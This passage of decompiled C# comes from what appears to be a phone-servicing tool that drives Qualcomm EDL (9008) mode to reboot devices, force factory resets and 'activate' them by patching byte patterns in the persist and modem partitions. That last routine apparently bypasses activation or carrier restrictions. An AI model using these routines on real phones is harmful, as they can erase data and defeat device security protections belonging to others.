			object value = ((Control)this.m_126).Text.Trim();
			if (string.IsNullOrEmpty((string)value))
			{
				MessageBox.Show("请填写端口号", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			((_003C_003Ec__DisplayClass310_0)obj).ConRes = -2;
			object CS_0024_003C_003E8__locals8 = new _003C_003Ec__DisplayClass310_1();
			((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass310_0)obj;
			((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl = new SerialPort(((Control)this.m_126).Text, 9600);
			try
			{
				try
				{
					((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl.Open();
				}
				catch
				{
					msgred();
					Msg("无法打开端口\n");
					return;
				}
				Msg("重启到EDL...");
				await Task.Run(async () =>
				{
					nint num3 = await LinQcPortClass.SenndXmls(((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl, firehose_pkts.EDL());
					((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).CS_0024_003C_003E8__locals1.ConRes = (int)num3;
				});
				((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl.Close();
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass310_1)CS_0024_003C_003E8__locals8).SepSl).Dispose();
				}
			}
			if (((_003C_003Ec__DisplayClass310_0)obj).ConRes == 1)
			{
				fa();
				Msg("OK\n");
				((Control)this.m_cf).Text = "重至EDL完成";
				((Checkbox)this.m_109).Checked = false;
			}
			else
			{
				msgred();
				Msg("Error\n");
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private async Task<bool> b7()
	{
		PortQcom = ((Control)this.m_126).Text;
		OpenDisk(PortQcom);
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			_ = Convert.ToInt64(item.NumSector) * Convert.ToInt64(item.SectorSize);
			ulong.Parse(item.Start);
			if (ErasePartDisk(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start))
			{
				continue;
			}
			return false;
		}
		DiskClose();
		return true;
	}

	private async Task<bool> b8()
	{
		PortQcom = ((Control)this.m_126).Text;
		OpenDisk(PortQcom);
		long num = 0L;
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			if (!File.Exists(item.File))
			{
				((Stopwatch)this.m_4b).Reset();
				continue;
			}
			object obj = File.OpenRead(item.File);
			try
			{
				num += ((Stream)obj).Length;
				nint num2 = Marshal.SizeOf<SparseImageHeader>(default);

				long num3 = 0L;
				_ = num3 + ((SparseImageHeader)CommandFormat.BytesToStuct(GetBytesFromFile((FileStream)obj, num3, (int)num2, out var bytesRead), typeof(SparseImageHeader))).uFileHeaderSize;
				object fileName = Path.GetFileName(item.File);
				if (item.Start.Contains("NUM"))
				{
					Log2("写入文件", Color.Black, isBold: false, newline: true);
					Log2((string)fileName, Color.Black, isBold: false);
					Log2(" > ", Color.Black, isBold: false);
					Log2(item.Name, Color.DimGray, isBold: false);
					Log2("... ", Color.Black, isBold: false);
					((Stopwatch)this.m_4b).Start();
					if (_5a(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start, item.File) == 0)
					{
						Log2("Error", Color.Red, isBold: true);
						Log2("", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						return false;
					}
					Log2("OK", Color.DodgerBlue, isBold: false);
					((Stopwatch)this.m_4b).Reset();
				}
				else
				{
					ulong.Parse(item.Start);
					Log2("写入补丁", Color.Black, isBold: false, newline: true);
					Log2("... ", Color.Black, isBold: false);
					((Stopwatch)this.m_4b).Start();
					if (_5a(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start, item.File) == 0)
					{
						Log2("Error", Color.Red, isBold: true);
						Log2("", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						return false;
					}
					Log2("OK", Color.DodgerBlue, isBold: false);
					((Stopwatch)this.m_4b).Reset();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		DiskClose();
		return true;
	}

	private async Task<bool> b9()
	{
		PortQcom = ((Control)this.m_126).Text;
		OpenDisk(PortQcom);
		long num = 0L;
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			if (!File.Exists(item.File))
			{
				((Stopwatch)this.m_4b).Reset();
				continue;
			}
			object obj = File.OpenRead(item.File);
			try
			{
				num += ((Stream)obj).Length;
				nint num2 = Marshal.SizeOf<SparseImageHeader>(default);

				long num3 = 0L;
				_ = num3 + ((SparseImageHeader)CommandFormat.BytesToStuct(GetBytesFromFile((FileStream)obj, num3, (int)num2, out var bytesRead), typeof(SparseImageHeader))).uFileHeaderSize;
				object fileName = Path.GetFileName(item.File);
				if (item.Start.Contains("NUM"))
				{
					Log2("写入文件", Color.Black, isBold: false, newline: true);
					Log2((string)fileName, Color.Black, isBold: false);
					Log2(" > ", Color.Black, isBold: false);
					Log2(item.Name, Color.DimGray, isBold: false);
					Log2("... ", Color.Black, isBold: false);
					((Stopwatch)this.m_4b).Start();
					if (_5a(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start, item.File) == 0)
					{
						Log2("Error", Color.Red, isBold: true);
						Log2("", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						return false;
					}
					Log2("OK", Color.DodgerBlue, isBold: false);
					((Stopwatch)this.m_4b).Reset();
				}
				else
				{
					ulong.Parse(item.Start);
					((Stopwatch)this.m_4b).Start();
					if (_5a(item.SectorSize, item.NumSector, item.PhysicalNum, item.Start, item.File) == 0)
					{
						Log2("Error", Color.Red, isBold: true);
						Log2("", Color.Red, isBold: true, newline: true);
						((Stopwatch)this.m_4b).Stop();
						DiskClose();
						return false;
					}
					((Stopwatch)this.m_4b).Reset();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		DiskClose();
		return true;
	}

	private async void ba(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			nint num3 = 0;
			object obj = "C:\\TMFTool";
			object file = Path.Combine((string)obj, "rec.img");
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj2 = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj2).Cells["name"].Value == null || !((DataGridViewRow)obj2).Cells["name"].Value.ToString().Contains("misc"))
					{
						continue;
					}
					num3 = 1;
					object obj3 = new FileStream((string)file, FileMode.Create, FileAccess.Write);
					try
					{
						object rec = Resources.rec;
						((Stream)obj3).Write((byte[])rec, 0, ((Array)rec).Length);
					}
					finally
					{
						((IDisposable)obj3)?.Dispose();
					}
					((List<RawPartition>)this.m_3e).Clear();
					object name = ((DataGridViewRow)obj2).Cells["name"].Value.ToString();
					object numsector = ((DataGridViewRow)obj2).Cells["num"].Value.ToString();
					object start = ((DataGridViewRow)obj2).Cells["star"].Value.ToString();
					object physicalNum = ((DataGridViewRow)obj2).Cells["L"].Value.ToString();
					object sectorSize = "4096";
					if (((UIRadioButton)this.m_d9).Checked)
					{
						sectorSize = "512";
					}
					((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					try
					{
						nint num4 = ((await Task.Run(() => b8())) ? 1 : 0);
						IntPtr intPtr2 = num4;
						if ((int)(nint)intPtr2 != 0)
						{
							OpenDisk(PortQcom);
							Log2("重启至Recovery...", Color.Black, isBold: false, newline: true);
							_56();
							((Checkbox)this.m_109).Checked = false;
							Log2("OK", Color.DodgerBlue, isBold: false);
							Log2("", Color.DodgerBlue, isBold: false, newline: true);
							((Control)this.m_cf).Text = "重启至恢复模式完成";
							DiskClose();
							bb(obj);
							break;
						}
						return;
					}
					catch (Exception ex)
					{
						MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					break;
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num3 == 0)
			{
				bc("请先阅览分区或选择XML解析分区表", Color.Red);
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private void bb(object folderPath)
	{
		string text = Path.Combine((string)folderPath, "rec.img");
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = Path.Combine((string)folderPath, "fd.img");
		if (File.Exists(text2))
		{
			File.Delete(text2);
		}
		string text3 = Path.Combine((string)folderPath, "misc.img");
		if (File.Exists(text3))
		{
			File.Delete(text3);
		}
	}

	private void bc(object message, Color color)
	{
		string message2 = (string)message;
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
				((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
				((TextBoxBase)this.m_c8).SelectionLength = 0;
				((RichTextBox)this.m_c8).SelectionColor = color;
				((TextBoxBase)this.m_c8).AppendText(message2 + Environment.NewLine);
				((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}));
		}
		else
		{
			((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
			((TextBoxBase)this.m_c8).SelectionLength = 0;
			((RichTextBox)this.m_c8).SelectionColor = color;
			((TextBoxBase)this.m_c8).AppendText(message2 + Environment.NewLine);
			((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async void bd(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			nint num3 = 0;
			object obj = "C:\\TMFTool";
			object file = Path.Combine((string)obj, "fd.img");
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj2 = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj2).Cells["name"].Value == null || !((DataGridViewRow)obj2).Cells["name"].Value.ToString().Contains("misc"))
					{
						continue;
					}
					num3 = 1;
					object obj3 = new FileStream((string)file, FileMode.Create, FileAccess.Write);
					try
					{
						object obj4 = Resources.fd;
						((Stream)obj3).Write((byte[])obj4, 0, ((Array)obj4).Length);
					}
					finally
					{
						((IDisposable)obj3)?.Dispose();
					}
					((List<RawPartition>)this.m_3e).Clear();
					object name = ((DataGridViewRow)obj2).Cells["name"].Value.ToString();
					object numsector = ((DataGridViewRow)obj2).Cells["num"].Value.ToString();
					object start = ((DataGridViewRow)obj2).Cells["star"].Value.ToString();
					object physicalNum = ((DataGridViewRow)obj2).Cells["L"].Value.ToString();
					object sectorSize = "4096";
					if (((UIRadioButton)this.m_d9).Checked)
					{
						sectorSize = "512";
					}
					((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					try
					{
						nint num4 = ((await Task.Run(() => b8())) ? 1 : 0);
						IntPtr intPtr2 = num4;
						if ((int)(nint)intPtr2 != 0)
						{
							OpenDisk(PortQcom);
							Log2("重启至FastbootD...", Color.Black, isBold: false, newline: true);
							_56();
							((Checkbox)this.m_109).Checked = false;
							Log2("OK", Color.DodgerBlue, isBold: false);
							Log2("", Color.DodgerBlue, isBold: false, newline: true);
							((Control)this.m_cf).Text = "重启至动态模式完成";
							DiskClose();
							bb(obj);
							break;
						}
						return;
					}
					catch (Exception ex)
					{
						MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					break;
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num3 == 0)
			{
				bc("请先阅览分区或选择XML解析分区表", Color.Red);
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private async Task be(object arguments, object port, object toolFolderPath)
	{
		object obj = "\"" + Path.Combine((string)toolFolderPath, "fh_loader.exe") + "\" " + (string)arguments;
		object startInfo = new ProcessStartInfo("cmd.exe", "/c " + (string)obj)
		{
			WorkingDirectory = (string)toolFolderPath,
			UseShellExecute = false,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			CreateNoWindow = true
		};
		object obj2 = new Process
		{
			StartInfo = (ProcessStartInfo)startInfo
		};
		try
		{
			((Process)obj2).Start();
			await ((Process)obj2).WaitForExitAsync();
			if (((Process)obj2).ExitCode == 0)
			{
				fe("EDL Patch Fastbootd...");
				fa();
				fe("OK\n");
				await bf(port, toolFolderPath);
			}
			else
			{
				fe("EDL Patch Fastbootd...");
				msgred();
				fe("Error\n");
				c0(toolFolderPath);
			}
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private async Task bf(object port, object toolFolderPath)
	{
		object obj = "\"" + Path.Combine((string)toolFolderPath, "fh_loader.exe") + "\" --port=" + (string)port + " --sendxml=" + Path.Combine((string)toolFolderPath, "reboot.xml") + " --noprompt";
		object startInfo = new ProcessStartInfo("cmd.exe", "/c " + (string)obj)
		{
			WorkingDirectory = (string)toolFolderPath,
			UseShellExecute = false,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			CreateNoWindow = true
		};
		object obj2 = new Process
		{
			StartInfo = (ProcessStartInfo)startInfo
		};
		try
		{
			((Process)obj2).Start();
			await ((Process)obj2).WaitForExitAsync();
			if (((Process)obj2).ExitCode == 0)
			{
				fe("EDL Reboot Fastbootd...");
				fa();
				fe("OK\n");
				c0(toolFolderPath);
			}
			else
			{
				fe("EDL Reboot Fastbootd...");
				msgred();
				fe("Error\n");
			}
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private void c0(object folderPath)
	{
		string text = Path.Combine((string)folderPath, "fd.img");
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = Path.Combine((string)folderPath, "reboot.xml");
		if (File.Exists(text2))
		{
			File.Delete(text2);
		}
	}

	private async void c1(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			nint num3 = 0;
			object obj = "C:\\TMFTool";
			object file = Path.Combine((string)obj, "misc.img");
			object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj2 = (DataGridViewRow)((IEnumerator)enumerator).Current;
					if (((DataGridViewRow)obj2).Cells["name"].Value == null || !((DataGridViewRow)obj2).Cells["name"].Value.ToString().Contains("misc"))
					{
						continue;
					}
					num3 = 1;
					object obj3 = new FileStream((string)file, FileMode.Create, FileAccess.Write);
					try
					{
						object commonmisc = Resources.commonmisc;
						((Stream)obj3).Write((byte[])commonmisc, 0, ((Array)commonmisc).Length);
					}
					finally
					{
						((IDisposable)obj3)?.Dispose();
					}
					((List<RawPartition>)this.m_3e).Clear();
					object name = ((DataGridViewRow)obj2).Cells["name"].Value.ToString();
					object numsector = ((DataGridViewRow)obj2).Cells["num"].Value.ToString();
					object start = ((DataGridViewRow)obj2).Cells["star"].Value.ToString();
					object physicalNum = ((DataGridViewRow)obj2).Cells["L"].Value.ToString();
					object sectorSize = "4096";
					if (((UIRadioButton)this.m_d9).Checked)
					{
						sectorSize = "512";
					}
					((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
					try
					{
						nint num4 = ((await Task.Run(() => b8())) ? 1 : 0);
						IntPtr intPtr2 = num4;
						if ((int)(nint)intPtr2 != 0)
						{
							OpenDisk(PortQcom);
							Log2("通用恢复出厂...", Color.Black, isBold: false, newline: true);
							_56();
							((Checkbox)this.m_109).Checked = false;
							Log2("OK", Color.DodgerBlue, isBold: false);
							Log2("", Color.DodgerBlue, isBold: false, newline: true);
							((Control)this.m_cf).Text = "恢复出厂完成";
							DiskClose();
							c2(obj);
							break;
						}
						return;
					}
					catch (Exception ex)
					{
						MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					break;
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (num3 == 0)
			{
				bc("请先阅览分区或选择XML解析分区表", Color.Red);
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private void c2(object folderPath)
	{
		string text = Path.Combine((string)folderPath, "misc.img");
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	private void c3(object text, Color? color = null)
	{
		if (color.HasValue)
		{
			((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
			((TextBoxBase)this.m_c8).SelectionLength = 0;
			((RichTextBox)this.m_c8).SelectionColor = color.Value;
			((TextBoxBase)this.m_c8).AppendText((string)text);
			((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText((string)text);
		}
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private async void c4(object sender, object e)
	{
		this.m_47 = OpreationMain.ACC;
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		if (!string.IsNullOrWhiteSpace(((Control)this.m_c5).Text))
		{
			Msg("请先读取分区表!\n");
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = 0;
		nint num3 = 0;
		nint num4 = 0;
		nint num5 = 0;
		object obj = null;
		object obj2 = null;
		object obj3 = null;
		object obj4 = null;
		object enumerator = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj5 = (DataGridViewRow)((IEnumerator)enumerator).Current;
				if (((DataGridViewRow)obj5).IsNewRow)
				{
					continue;
				}
				object value = ((DataGridViewRow)obj5).Cells["name"].Value;
				if (value != null)
				{
					object obj6 = value.ToString();
					if ((string)obj6 == "persist")
					{
						num2 = 1;
						obj = obj5;
					}
					else if ((string)obj6 == "modem")
					{
						num3 = 1;
						obj2 = obj5;
					}
					else if ((string)obj6 == "modem_a")
					{
						num4 = 1;
						obj3 = obj5;
					}
					else if ((string)obj6 == "modem_b")
					{
						num5 = 1;
						obj4 = obj5;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		((UIProcessBar)this.m_c1).Value = 0;
		((UIProcessBar)this.m_c1).Maximum = 100;
		if ((int)(num2 & num3) != 0)
		{
			object url = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/acc.zip");
			object obj7 = Path.Combine(Path.GetTempPath(), "acc.zip");
			object destinationDirectoryName = "C:\\TMFTool";
			try
			{
				if (!Directory.Exists((string)destinationDirectoryName))
				{
					Directory.CreateDirectory((string)destinationDirectoryName);
				}
				await _111(url, obj7, (Action<int>)((int progress) =>
				{
					((UIProcessBar)this.m_c1).Value = (int)progress;
				}));
				ZipFile.ExtractToDirectory((string)obj7, (string)destinationDirectoryName);
			}
			catch (Exception)
			{
			}
			finally
			{
				if (File.Exists((string)obj7))
				{
					File.Delete((string)obj7);
				}
			}
			((Control)this.m_ed).Enabled = false;
			((Control)this.m_89).Enabled = false;
			((Control)_88).Enabled = false;
			((Control)this.m_c2).Enabled = false;
			((Control)this.m_cb).Enabled = false;
			((Control)this.m_ec).Enabled = false;
			((Control)this.m_c6).Enabled = false;
			((Control)this.m_c2).Enabled = false;
			c3("当前操作激活设备 执行过程不要操作-解决only设备无法激活的Bug\n", Color.Black);
			c3("开始读取信息...", Color.Black);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			nint num6 = ((obj != null) ? 1 : 0);
			nint num7 = num6;
			if (num7 != 0)
			{
				nint num8 = ((await c6(obj)) ? 1 : 0);
				num7 = num8;
			}
			nint num9 = num7;
			if (num9 == 0)
			{
				return;
			}
			nint num10 = ((obj2 != null) ? 1 : 0);
			nint num11 = num10;
			if (num11 != 0)
			{
				nint num12 = ((await c6(obj2)) ? 1 : 0);
				num11 = num12;
			}
			nint num13 = num11;
			if (num13 == 0)
			{
				return;
			}
			fa();
			Msg("OK\n");
			Msg("\n");
			if ((int)(num9 & num13) == 0)
			{
				return;
			}
			((TextBoxBase)this.m_c8).AppendText("修改信息...");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			nint num14 = ((await c9("persist", "66647364", "00000000")) ? 1 : 0);
			nint num15 = num14;
			nint num16 = ((await c9("modem", "63617264617070", "00000000000000")) ? 1 : 0);
			nint num17 = num16;
			nint num18 = ((await c9("modem", "41630061007200640061", "41E50061007200640061")) ? 1 : 0);
			nint num19 = num18;
			fa();
			Msg("OK\n");
			if ((int)(num15 & num17 & num19) == 0)
			{
				return;
			}
			Log2("写入补丁", Color.Black, isBold: false, newline: true);
			Log2("... ", Color.Black, isBold: false);
			nint num20 = ((await ca(obj, "persist.img")) ? 1 : 0);
			nint num21 = num20;
			if (num21 == 0)
			{
				return;
			}
			nint num22 = ((await ca(obj2, "modem.img")) ? 1 : 0);
			nint num23 = num22;
			if (num23 == 0)
			{
				return;
			}
			Log2("OK", Color.DodgerBlue, isBold: false);
			if ((int)(num21 & num23) == 0)
			{
				return;
			}
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
				((UIProcessBar)this.m_c1).Value = 0;
				c5((uint)((UIProcessBar)this.m_c1).Maximum);
				fe("\n");
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("激活设备成功 请重启设备！\n");
				((Control)this.m_cf).Text = "设备状态正常";
				((TextBoxBase)this.m_c8).ScrollToCaret();
				if (((Checkbox)this.m_108).Checked)
				{
					OpenDisk(PortQcom);
					Log2("重启设备...", Color.Black, isBold: false, newline: true);
					_56();
					((Checkbox)this.m_109).Checked = false;
					Log2("OK", Color.DodgerBlue, isBold: false);
					Log2("", Color.DodgerBlue, isBold: false, newline: true);
					((Control)this.m_cf).Text = "重启设备完成";
					DiskClose();
				}
				cb();
				cc();
				((Control)this.m_ed).Enabled = true;
				((Control)this.m_89).Enabled = true;
				((Control)_88).Enabled = true;
				((Control)this.m_c2).Enabled = true;
				((Control)this.m_cb).Enabled = true;
				((Control)this.m_ec).Enabled = true;
				((Control)this.m_c6).Enabled = true;
				((Control)this.m_c2).Enabled = true;
			}));
		}
		else if ((int)(((num3 == 0) ? 1 : 0) & num2 & num4 & num5) != 0)
		{
			((UIProcessBar)this.m_c1).Maximum = 100;
			object url2 = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/acc.zip");
			object obj8 = Path.Combine(Path.GetTempPath(), "acc.zip");
			object destinationDirectoryName2 = "C:\\TMFTool";
			try
			{
				if (!Directory.Exists((string)destinationDirectoryName2))
				{
					Directory.CreateDirectory((string)destinationDirectoryName2);
				}
				await _111(url2, obj8, (Action<int>)((int progress) =>
				{
					((UIProcessBar)this.m_c1).Value = (int)progress;
				}));
				ZipFile.ExtractToDirectory((string)obj8, (string)destinationDirectoryName2);
			}
			catch (Exception)
			{
			}
			finally
			{
				if (File.Exists((string)obj8))
				{
					File.Delete((string)obj8);
				}
			}
			((Control)this.m_ed).Enabled = false;
			((Control)this.m_89).Enabled = false;
			((Control)_88).Enabled = false;
			((Control)this.m_c2).Enabled = false;
			((Control)this.m_cb).Enabled = false;
			((Control)this.m_ec).Enabled = false;
			((Control)this.m_c6).Enabled = false;
			((Control)this.m_c2).Enabled = false;
			c3("当前操作激活设备 执行过程不要操作-解决系统无法激活的BUG\n", Color.Black);
			c3("开始读取信息...", Color.Black);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			nint num24 = ((obj != null) ? 1 : 0);
			nint num25 = num24;
			if (num25 != 0)
			{
				nint num26 = ((await c6(obj)) ? 1 : 0);
				num25 = num26;
			}
			nint num27 = num25;
			if (num27 == 0)
			{
				return;
			}
			nint num28 = ((obj3 != null) ? 1 : 0);
			nint num29 = num28;
			if (num29 != 0)
			{
				nint num30 = ((await c6(obj3)) ? 1 : 0);
				num29 = num30;
			}
			nint num31 = num29;
			if (num31 == 0)
			{
				return;
			}
			nint num32 = ((obj4 != null) ? 1 : 0);
			nint num33 = num32;
			if (num33 != 0)
			{
				nint num34 = ((await c6(obj4)) ? 1 : 0);
				num33 = num34;
			}
			nint num35 = num33;
			if (num35 == 0)
			{
				return;
			}
			fa();
			Msg("OK\n");
			Msg("\n");
			if ((int)(num27 & num31 & num35) == 0)
			{
				return;
			}
			((RichTextBox)this.m_c8).SelectionColor = Color.DeepSkyBlue;
			((TextBoxBase)this.m_c8).AppendText("修改信息...");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			nint num36 = ((await c9("persist", "66647364", "00000000")) ? 1 : 0);
			nint num37 = num36;
			nint num38 = ((await c9("modem_a", "63617264617070", "00000000000000")) ? 1 : 0);
			nint num39 = num38;
			nint num40 = ((await c9("modem_a", "41630061007200640061", "41E50061007200640061")) ? 1 : 0);
			nint num41 = num40;
			nint num42 = ((await c9("modem_b", "63617264617070", "00000000000000")) ? 1 : 0);
			nint num43 = num42;
			nint num44 = ((await c9("modem_b", "41630061007200640061", "41E50061007200640061")) ? 1 : 0);
			nint num45 = num44;
			((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
			((TextBoxBase)this.m_c8).AppendText("OK\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			if ((int)(num37 & num39 & num41 & num43 & num45) == 0)
			{
				return;
			}
			Log2("写入补丁", Color.Black, isBold: false, newline: true);
			Log2("... ", Color.Black, isBold: false);
			nint num46 = ((await ca(obj, "persist.img")) ? 1 : 0);
			nint num47 = num46;
			if (num47 == 0)
			{
				return;
			}
			nint num48 = ((await ca(obj3, "modem_a.img")) ? 1 : 0);
			nint num49 = num48;
			if (num49 == 0)
			{
				return;
			}
			nint num50 = ((await ca(obj4, "modem_b.img")) ? 1 : 0);
			nint num51 = num50;
			if (num51 == 0)
			{
				return;
			}
			Log2("OK", Color.DodgerBlue, isBold: false);
			if ((int)(num47 & num49 & num51) == 0)
			{
				return;
			}
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
				((UIProcessBar)this.m_c1).Value = 0;
				c5((uint)((UIProcessBar)this.m_c1).Maximum);
				fe("\n");
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("激活设备完成，请重启设备！\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				((Control)this.m_cf).Text = "设备正常";
				if (((Checkbox)this.m_108).Checked)
				{
					OpenDisk(PortQcom);
					Log2("重启设备...", Color.Black, isBold: false, newline: true);
					_56();
					((Checkbox)this.m_109).Checked = false;
					Log2("OK", Color.DodgerBlue, isBold: false);
					Log2("", Color.DodgerBlue, isBold: false, newline: true);
					((Control)this.m_cf).Text = "重启设备完成";
					DiskClose();
				}
				cb();
				cc();
				((Control)this.m_ed).Enabled = true;
				((Control)this.m_89).Enabled = true;
				((Control)_88).Enabled = true;
				((Control)this.m_c2).Enabled = true;
				((Control)this.m_cb).Enabled = true;
				((Control)this.m_ec).Enabled = true;
				((Control)this.m_c6).Enabled = true;
				((Control)this.m_c2).Enabled = true;
			}));
		}
		else
		{
			c3("请解析分区表或选择xml文件\n", Color.Red);
			((TextBoxBase)this.m_c8).ScrollToCaret();
